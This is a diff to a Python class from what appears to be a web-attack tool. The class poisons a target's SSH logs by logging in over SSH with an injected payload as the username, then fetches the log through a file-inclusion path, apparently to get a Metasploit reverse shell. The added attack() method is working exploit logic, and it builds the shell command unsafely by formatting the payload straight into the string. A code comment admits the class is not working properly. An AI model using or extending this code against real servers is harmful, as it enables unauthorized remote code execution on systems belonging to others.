@@ -4,16 +4,34 @@ from urllib import parse
 from .utils import listener, attack, colors, cook, msf_payload
 
 
+from .Detection import Detection
+
 #TODO: Not working properly. Fix this
 class SSHLogs:
-    def __init__(self, target, location, relative, cookies):
+    def __init__(self, args):
 
-        self.target = target
-        self.location = location
-        self.relative = relative
-        self.cookies = cookies
+        self.target = args.url
+        self.location = args.location
+        self.relative = args.relative
+        self.cookies = args.cookies
+        self.detection = args.detection
+
+    def attack(self, payload):
+        host = parse.urlsplit(self.target).netloc
+        system('/usr/bin/ssh "{0}@{1}"'.format(payload, host))
+
+        if self.cookies:
+            f_cookies = cook(self.cookies)
+            response = attack(self.target, self.location, cookies=f_cookies)
+        else:
+            response = attack(self.target, self.location)
+        return response
 
     def execute_ssh(self):
+        if self.detection:
+            detector = Detection(self)
+            detector.detect()
+            return
 
         lhost, lport, shell = msf_payload()
 
